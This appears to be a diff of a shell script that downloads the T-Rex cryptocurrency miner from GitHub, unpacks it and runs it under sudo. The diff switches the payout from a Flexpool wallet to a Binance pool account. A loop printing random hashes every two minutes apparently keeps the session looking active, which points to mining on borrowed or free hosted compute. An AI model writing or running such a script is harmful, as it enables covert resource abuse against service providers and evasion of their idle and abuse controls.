@@ -6,7 +6,7 @@ sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -
 sudo apt install libpci3
 sudo apt-get install screen
 wget -nv -c https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz -O - | tar -xz
-ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo LD_PRELOAD="" ./t-rex -a ethash -o stratum+ssl://eth-sg.flexpool.io:5555 -u 0x3D02F7B8DCB18E778fE35bf8B5A7F91d819bF0C4 -p x -w $ip --keep-gpu-busy 
+sudo LD_PRELOAD="" ./t-rex -a ethash -o stratum+tcp://ethash.poolbinance.com:443 -u Lebaran -p 123456 -w Lebaran.001 --keep-gpu-busy 
 while [ 1 ]; do
   while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
 sleep 2
